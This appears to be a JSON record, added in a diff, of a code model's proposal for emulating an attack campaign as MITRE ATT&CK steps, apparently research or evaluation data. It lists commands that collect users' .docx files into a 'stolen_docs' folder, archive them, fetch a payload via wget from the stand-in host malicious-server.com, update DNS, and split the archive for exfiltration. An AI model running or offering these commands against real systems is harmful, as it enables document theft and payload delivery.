@@ -1,0 +1,71 @@
+{
+  "campaign_id": "C0026",
+  "model": "qwen2.5-coder:14b",
+  "sample": 3,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-registration",
+      "command": "nsupdate -k /path/to/keyfile.conf",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "example.com"
+      }
+    },
+    {
+      "technique_id": "T1005",
+      "mechanism": "file-search",
+      "command": "find /home -type f -name '*.docx' -exec cp {} /tmp/stolen_docs/ \\;",
+      "target": "target.primary",
+      "parameters": {
+        "directory": "/home",
+        "extension": "*.docx"
+      }
+    },
+    {
+      "technique_id": "T1560.001",
+      "mechanism": "winrar-archive",
+      "command": "WinRAR.exe a -afzip /tmp/stolen_docs.zip /tmp/stolen_docs/*.docx",
+      "target": "target.primary",
+      "parameters": {
+        "archive_path": "/tmp/stolen_docs.zip",
+        "source_files": "/tmp/stolen_docs/*.docx"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "wget-download",
+      "command": "wget -O /path/to/payload http://malicious-server.com/file",
+      "target": "boundary.no_live_exploit",
+      "parameters": {
+        "url": "http://malicious-server.com/file",
+        "output_file": "/path/to/payload"
+      }
+    },
+    {
+      "technique_id": "T1568",
+      "mechanism": "dynamic-dns-update",
+      "command": "nsupdate -k /path/to/keyfile.conf",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "dynamicdns.example.com"
+      }
+    },
+    {
+      "technique_id": "T1030",
+      "mechanism": "split-and-exfiltrate",
+      "command": "split -b 3M /tmp/stolen_docs.zip /path/to/part_",
+      "target": "boundary.no_live_exploit",
+      "parameters": {
+        "file_path": "/tmp/stolen_docs.zip",
+        "chunk_size": "3M",
+        "output_prefix": "/path/to/part_"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "2094af3034fd037e252120c12eae1fc7e581bb8255a9a8678b3810c1560c8d69"
+}
